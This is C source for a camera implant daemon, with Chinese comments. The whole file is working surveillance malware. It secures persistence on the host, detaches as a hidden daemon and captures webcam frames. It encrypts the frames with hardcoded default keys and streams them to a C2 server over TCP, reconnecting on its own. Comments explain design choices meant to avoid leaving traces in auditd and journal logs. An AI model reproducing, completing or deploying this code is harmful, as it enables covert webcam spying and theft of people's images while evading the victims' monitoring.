/*
 * agent_windows/src/cam_daemon.c
 *
 * 摄像头常驻守护实现。见 include/cam_daemon.h 的分工说明。
 *
 * 刻意不引入任何 Windows API：驻留走 persist_linux_ensure（Linux 真实
 * 实现），采集走 camera.h 工厂，回传走 21_exfil。因此本文件能在 Linux
 * 下被真实编译、真实执行 —— 不是等上机才能验证的纸面代码。
 */

/* clock_gettime / CLOCK_MONOTONIC 在 -std=c99 -pedantic 下不暴露：
 * glibc 需要特性测试宏，且必须在任何 include 之前定义（与 cam_linux_v4l2.c
 * 同源的坑）。缺了它报的是 "CLOCK_MONOTONIC undeclared"，与真实逻辑无关，
 * 却会让人误以为是时钟源选错了。 */
#ifndef _DEFAULT_SOURCE
#define _DEFAULT_SOURCE 1
#endif

#include "cam_daemon.h"

#include "camera.h"
#include "implant.h"
#include "persist.h"

#include "exfil.h"
#include "exfil_link.h"
#include "p2p_cell.h"

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

/* 内置测试密钥：仅当 cfg 未指定时使用。部署必须显式配置。 */
static const uint8_t DEF_K_SEND[16] = {
    0x0b,0x1c,0x2d,0x3e,0x4f,0x50,0x61,0x72,
    0x83,0x94,0xa5,0xb6,0xc7,0xd8,0xe9,0xfa
};
static const uint8_t DEF_K_RECV[16] = {
    0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87,
    0x78,0x69,0x5a,0x4b,0x3c,0x2d,0x1e,0x0f
};
static const uint8_t DEF_PFX[8] = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00,0x11 };

/* ---- 停止信号 ---- */
static volatile sig_atomic_t g_stop = 0;
static implant_t * volatile  g_im   = NULL;

void cam_daemon_request_stop(void) { g_stop = 1; }

static void cd_on_signal(int sig)
{
    (void)sig;
    /* 只置标志 + 置 implant 停止位。两者都是单标志赋值，
     * 不做 malloc / IO / 加锁，保证在信号处理器里调用是安全的。 */
    g_stop = 1;
    if (g_im) implant_stop(g_im);
}

/* ---- 微秒时钟 ---- */
static uint64_t cd_now_us(void *ud)
{
    (void)ud;
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        return (uint64_t)time(NULL) * 1000000ULL;
    }
    return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
}

/*
 * 从 JPEG 码流解析宽高。
 *
 * 为什么需要：implant 的 pack 回调签名只有 (in, in_len)，拿不到
 * cam_frame_t 的 width/height。改 implant 接口会牵动全部既有测试；
 * 而从 SOF 标记解析是 JPEG 规范内的确定行为，零副作用。
 *
 * 返回 0 成功；-1 非法 / 未找到 SOF。
 */
static int cd_jpeg_dims(const uint8_t *d, size_t n, uint32_t *w, uint32_t *h)
{
    if (!d || n < 4 || d[0] != 0xFF || d[1] != 0xD8) return -1;

    size_t i = 2;
    while (i + 9 <= n) {
        if (d[i] != 0xFF) { i++; continue; }

        uint8_t m = d[i + 1];
        /* 无长度字段的独立标记 */
        if (m == 0x01 || (m >= 0xD0 && m <= 0xD7)) { i += 2; continue; }
        if (m == 0xD8) { i += 2; continue; }
        if (m == 0xD9) return -1;                    /* EOI 先于 SOF */

        size_t seglen = ((size_t)d[i + 2] << 8) | (size_t)d[i + 3];
        if (seglen < 2 || i + 2 + seglen > n) return -1;

        /* SOFn：C4/D8/D9/DA 之外的 SOF 家族成员 */
        if ((m >= 0xC0 && m <= 0xC3) || (m >= 0xC5 && m <= 0xC7) ||
            (m >= 0xC9 && m <= 0xCB) || (m >= 0xCD && m <= 0xCF)) {
            if (i + 9 > n) return -1;
            *h = ((uint32_t)d[i + 5] << 8) | (uint32_t)d[i + 6];
            *w = ((uint32_t)d[i + 7] << 8) | (uint32_t)d[i + 8];
            return 0;
        }
        if (m == 0xDA) return -1;                    /* SOS 先于 SOF */
        i += 2 + seglen;
    }
    return -1;
}

/* ---- 回传上下文 ---- */
typedef struct {
    exfil_chan_t chan;
    int          sink_fd;
    int          sink_owned;   /* 1 = 本进程 open，退出时 close */
    int          is_sock;      /* 1 = socket fd，走 send(MSG_NOSIGNAL) */
    uint64_t     seq;
    uint64_t     bytes_out;
    uint32_t     batches;
    const char  *name;
    int          last_err;

    /* tcp:// 重连所需。仅当 spec 是 tcp:// 时填充。
     *
     * 为何必须进程内重连：
     *   边采边发时 C2 断线是常态（网络抖动、C2 重启、目标机休眠唤醒）。
     *   若依赖 systemd 的 Restart=always 兜底，代价是——
     *     1) 断线期间已采集的帧随进程退出全部丢失；
     *     2) 每次断线都产生一次进程启停，在 auditd/journal 里留下可关联痕迹；
     *     3) RestartSec 期间采集完全停摆。
     *   进程内重连只丢"正在写的那一批"，且不留启停记录。 */
    char         host[256];
    char         port[16];
    uint32_t     reconnects;   /* 成功重连次数，供 status 观测 */
} cd_sink_t;

/* 前向声明：cd_write_all 定义在前，写失败时要回调重连。 */
static int cd_sink_reconnect(cd_sink_t *s);

/*
 * 写出信元。
 *
 * 必须区分 socket 与常规文件：链路层 exfil_link_write_all 用的是
 * send(fd, …, MSG_NOSIGNAL)，在**常规文件 fd 上返回 ENOTSOCK**。
 * 这是真实的集成约束 —— 直接用它写文件，每一帧都会静默失败，
 * 而上层只看到"回传失败"，看不出是 fd 类型不匹配。
 *
 * socket 路径坚持用链路层而非裸 write：MSG_NOSIGNAL 是必需的，
 * 对端关闭时裸 write 会触发 SIGPIPE 直接杀死常驻进程。
 */
static int cd_write_all(cd_sink_t *s, const uint8_t *buf, size_t n)
{
    if (!s || s->sink_fd < 0) return -1;

    if (s->is_sock) {
        if (exfil_link_write_all(s->sink_fd, buf, n) == 0) return 0;

        /* 写失败且是 tcp:// 出口 → 进程内重连后重试一次。
         *
         * 只重试一次，不做循环：下一批采集会自然再试（采集循环自带
         * interval_ms 节拍），在此处自旋只会空转 CPU 并放大网络压力。
         * 代价是断开期间这一批帧丢失——可接受，因为重连成功后的批次
         * 立即恢复，而 systemd 重启方案丢的是整段重启窗口。 */
        if (s->host[0] && cd_sink_reconnect(s) == 0)
            return exfil_link_write_all(s->sink_fd, buf, n);
        return -1;
    }

    size_t off = 0;
    while (off < n) {
        ssize_t w = write(s->sink_fd, buf + off, n - off);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (w == 0) return -1;          /* 不应发生；防死循环 */
        off += (size_t)w;
    }
    return 0;
}

static int cd_pack(const uint8_t *in, size_t in_len,
                   uint8_t *out, size_t *out_len, void *ud)
{
    cd_sink_t *s = (cd_sink_t *)ud;
    if (!s || !in || !out || !out_len) return -1;

    uint32_t w = 0, h = 0;
    if (cd_jpeg_dims(in, in_len, &w, &h) != 0) {
        /* 解析不出尺寸不阻断回传：宽高是元数据，帧本体仍然有效。
         * 置 0 由接收侧按"未知"处理，好过为了元数据丢掉一整帧。 */
        w = 0; h = 0;
    }

    exfil_rec_t r;
    memset(&r, 0, sizeof r);
    r.type    = EXF_TYPE_CAMERA_JPEG;
    r.seq     = s->seq++;
    r.ts_us   = cd_now_us(NULL);
    r.width   = w;
    r.height  = h;
    r.flags   = EXF_FLAG_KEYFRAME | EXF_FLAG_LAST;
    r.payload = in;
    r.plen    = in_len;
    if (s->name) snprintf(r.name, sizeof r.name, "%s", s->name);

    size_t ncells = 0;
    if (exfil_send_cells(&r, &ncells) != 0) return -1;

    size_t need = ncells * (size_t)P2P_CELL_WIRE;
    if (*out_len < need) { *out_len = need; return -2; }   /* 容量不足，回填所需 */

    size_t got = 0;
    if (exfil_chan_send(&s->chan, &r, out, *out_len, &got) != 0) return -3;

    *out_len = need;
    return 0;
}

static int cd_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
{
    cd_sink_t *s = (cd_sink_t *)ud;
    (void)name;
    if (!s || !data || len == 0) return -1;
    if (s->sink_fd < 0) { s->last_err = -1; return -1; }

    if (cd_write_all(s, data, len) != 0) {
        s->last_err = errno ? -errno : -1;
        return -1;
    }
    s->bytes_out += len;
    s->batches++;
    return 0;
}

/* ---- tcp:// 边采边发 ----
 *
 * 背景：此前唯一可用的实时出口是 fd://N（父进程传入已打开的 fd）。这要求
 * 部署方自己先建好连接再传进来，C2 一断就只能靠外部重启——见 cd_sink_t
 * 里 reconnects 字段的注释。tcp:// 让 camd 自己建连、自己续连。
 */

/*
 * 解析 "tcp://host:port"。
 *
 * IPv6 字面量含冒号，用 strrchr 取最后一个冒号而不是 strchr 取第一个，
 * 否则 "tcp://[::1]:9000" 会被切成 host="[" port="::1]:9000"。
 * 支持 "[::1]:9000" 的方括号形式，剥掉方括号后再交给 getaddrinfo。
 */
static int cd_parse_tcp(const char *spec, char *host, size_t hcap,
                        char *port, size_t pcap)
{
    if (strncmp(spec, "tcp://", 6) != 0) return -1;
    const char *hp = spec + 6;
    if (!*hp) return -1;

    const char *colon = strrchr(hp, ':');
    if (!colon || colon == hp || !colon[1]) return -1;

    size_t plen = strlen(colon + 1);
    if (plen >= pcap) return -1;

    const char *hs = hp;
    size_t hlen = (size_t)(colon - hp);
    if (hlen >= 2 && hs[0] == '[' && colon[-1] == ']') {
        hs += 1;
        hlen -= 2;                 /* 剥掉方括号 */
    }
    if (hlen == 0 || hlen >= hcap) return -1;

    memcpy(host, hs, hlen); host[hlen] = '\0';
    memcpy(port, colon + 1, plen); port[plen] = '\0';
    return 0;
}

/* 建一条 TCP 连接。成功返回 fd，失败返回 -1。 */
static int cd_tcp_connect(const char *host, const char *port)
{
    struct addrinfo hints, *res = NULL, *ai = NULL;
    memset(&hints, 0, sizeof hints);
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family   = AF_UNSPEC;      /* 同时接受 v4/v6，由 getaddrinfo 排序 */

    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;

    int fd = -1;
    for (ai = res; ai; ai = ai->ai_next) {
        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;

        /* TCP_NODELAY：信元是 512 字节级小包，Nagle 会攒包，把实时回传
         * 变成"攒够一批才发"。 */
        int one = 1;
        (void)setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof one);

        /* SO_KEEPALIVE：对端主机断电/断网时本机不会收到 FIN，连接会一直
         * 挂着，写入也不报错——表现为"在跑但零产出"。保活让它最终报错，
         * 从而触发下面的进程内重连。 */
        (void)setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof one);

        if (connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/*
 * 重连：关掉旧 fd，重新建连。
 *
 * 失败即返回 -1，由调用方决定重试节奏。刻意不做无限重试——采集循环本身
 * 有节拍（interval_ms），下一批会自然再试，无需在此处自旋空转 CPU。
 */
static int cd_sink_reconnect(cd_sink_t *s)
{
    if (!s->host[0]) return -1;          /* 非 tcp:// 出口，无重连语义 */
    if (s->sink_owned && s->sink_fd >= 0) close(s->sink_fd);
    s->sink_fd = -1;

    int fd = cd_tcp_connect(s->host, s->port);
    if (fd < 0) return -1;

    s->sink_fd   = fd;
    s->sink_owned = 1;
    s->is_sock   = 1;
    s->reconnects++;
    return 0;
}

/* ---- sink 打开：支持 fd://N、tcp://host:port 与文件路径 ---- */
static int cd_sink_open(const char *spec, cd_sink_t *s)
{
    s->sink_fd = -1;
    s->sink_owned = 0;
    if (!spec) return 0;                 /* NULL = 不回传（仅测试） */

    if (strncmp(spec, "fd://", 5) == 0) {
        long n = strtol(spec + 5, NULL, 10);
        if (n < 0 || n > 65535) return -1;
        s->sink_fd = (int)n;
        s->sink_owned = 0;               /* 不属于本进程，绝不 close */
        return 0;
    }

    if (strncmp(spec, "tcp://", 6) == 0) {
        if (cd_parse_tcp(spec, s->host, sizeof s->host,
                         s->port, sizeof s->port) != 0) return -1;

        /* SIGPIPE 必须忽略。
         *
         * 不是理论风险：C2 进程退出后，本机第一次写入收到 RST，第二次
         * 写入触发 SIGPIPE，默认动作是**杀死进程**。于是"对端重启一次"
         * 就等于"植入体静默消失"，而 systemd 的 Restart=always 会把它
         * 拉起来——表面上自愈了，实际丢了一批帧且留下了启停记录。
         * 忽略后写入返回 EPIPE，交给下面的进程内重连处理。 */
        signal(SIGPIPE, SIG_IGN);

        int fd = cd_tcp_connect(s->host, s->port);
        if (fd < 0) return -1;
        s->sink_fd    = fd;
        s->sink_owned = 1;
        s->is_sock    = 1;
        return 0;
    }

    int fd = open(spec, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd < 0) return -1;
    s->sink_fd = fd;
    s->sink_owned = 1;
    s->is_sock = 0;
    return 0;
}

/* 判定 fd 是否为 socket。用于选择 send(MSG_NOSIGNAL) 还是 write()。 */
static int cd_fd_is_socket(int fd)
{
    struct stat st;
    if (fd < 0) return 0;
    if (fstat(fd, &st) != 0) return 0;
    return S_ISSOCK(st.st_mode) ? 1 : 0;
}

static void cd_sink_close(cd_sink_t *s)
{
    if (s->sink_owned && s->sink_fd >= 0) close(s->sink_fd);
    s->sink_fd = -1;
    s->sink_owned = 0;
}

/* ---- pid 文件 ---- */
static int cd_write_pid(const char *path)
{
    if (!path) return 0;
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return -1;
    char b[32];
    int n = snprintf(b, sizeof b, "%ld\n", (long)getpid());
    ssize_t w = write(fd, b, (size_t)n);
    close(fd);
    return (w == (ssize_t)n) ? 0 : -1;
}

/* ---- 守护进程化 ---- */
static int cd_daemonize(void)
{
    pid_t p = fork();
    if (p < 0) return -1;
    if (p > 0) _exit(0);                 /* 父进程立即退出 */

    if (setsid() < 0) return -1;

    /* 二次 fork：确保不是 session leader，永不重新获得控制终端 */
    p = fork();
    if (p < 0) return -1;
    if (p > 0) _exit(0);

    if (chdir("/") != 0) return -1;
    umask(077);

    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        if (devnull > 2) close(devnull);
    }
    return 0;
}

/* ---- 主入口 ---- */
int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
{
    cam_daemon_stats_t st;
    memset(&st, 0, sizeof st);
    st.persist_rc = -9;                  /* -9 = 未执行，区别于 -1 失败 */

    if (!cfg) { if (out_stats) *out_stats = st; return -1; }

    /* 1) 驻留：先于 daemonize，使失败能在调用方终端上可见 */
    if (cfg->ensure_persist) {
        st.persist_rc = persist_linux_ensure(cfg->root_prefix,
                                             st.bin_path, sizeof st.bin_path,
                                             st.methods, CAM_DAEMON_PERSIST_N);
        if (st.persist_rc < 0) {
            if (out_stats) *out_stats = st;
            return -2;
        }
    }

    /* 2) 回传通道 + sink */
    const uint8_t *ks = cfg->k_send ? cfg->k_send : DEF_K_SEND;
    const uint8_t *kr = cfg->k_recv ? cfg->k_recv : DEF_K_RECV;
    const uint8_t *pf = cfg->pfx     ? cfg->pfx    : DEF_PFX;

    cd_sink_t sink;
    memset(&sink, 0, sizeof sink);
    sink.name = "camera";

    if (exfil_chan_init(&sink.chan, ks, kr, pf, 0) != 0) {
        if (out_stats) *out_stats = st;
        return -4;
    }
    if (cd_sink_open(cfg->sink_path, &sink) != 0) {
        exfil_chan_wipe(&sink.chan);
        if (out_stats) *out_stats = st;
        return -4;
    }
    /* fd://N 传入的 fd 类型未知（可能是 socket 也可能是文件），必须实测。
     * 判错会让 send() 在文件上 ENOTSOCK，每一帧都静默丢弃。 */
    sink.is_sock = cd_fd_is_socket(sink.sink_fd);

    /* 3) 采集编排 */
    implant_cfg_t ic;
    memset(&ic, 0, sizeof ic);
    ic.cam.width      = cfg->width;
    ic.cam.height     = cfg->height;
    ic.cam.fps        = cfg->fps;
    ic.cam.capture_ms = cfg->capture_ms;
    ic.cam.max_frames = cfg->frames_per_batch;
    ic.cam.prefer_mjpeg = true;
    ic.interval_ms      = cfg->interval_ms;
    ic.jitter_ms        = cfg->jitter_ms;
    ic.max_batches      = cfg->max_batches;
    ic.frames_per_batch = cfg->frames_per_batch;
    ic.jpeg_quality     = cfg->jpeg_quality;
    ic.stop_on_error    = false;   /* 常驻进程：单批失败不应终止整个守护 */
    ic.run_defend       = cfg->run_defend ? true : false;

    implant_t *im = implant_create(&ic, cfg->backend);
    if (!im) {
        cd_sink_close(&sink);
        exfil_chan_wipe(&sink.chan);
        if (out_stats) *out_stats = st;
        return -3;
    }

    implant_set_now(im, cd_now_us, NULL);
    implant_set_pack(im, cd_pack, &sink);
    implant_set_exfil(im, cd_exfil, &sink);

    /* 4) 信号：daemonize 之后安装，避免被父进程的处置方式影响 */
    g_im = im;
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = cd_on_signal;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGHUP,  &sa, NULL);

    /* 5) 后台化（在驻留与接线全部成功之后，失败不会无声消失） */
    if (cfg->daemonize) {
        if (cd_daemonize() != 0) {
            implant_destroy(im);
            cd_sink_close(&sink);
            exfil_chan_wipe(&sink.chan);
            if (out_stats) *out_stats = st;
            return -5;
        }
        cd_write_pid(cfg->pid_path);
    } else if (cfg->pid_path) {
        cd_write_pid(cfg->pid_path);
    }

    /* 6) 主循环 */
    implant_err_t e = implant_run(im);

    const implant_stats_t *is = implant_stats(im);
    if (is) {
        st.batches   = is->batches_done;
        st.frames    = is->frames_total;
    }
    st.bytes_out = sink.bytes_out;
    st.last_err  = e;

    implant_destroy(im);
    g_im = NULL;

    cd_sink_close(&sink);
    exfil_chan_wipe(&sink.chan);

    if (out_stats) *out_stats = st;
    return (e == IMPLANT_OK || e == IMPLANT_STOPPED) ? 0 : -6;
}
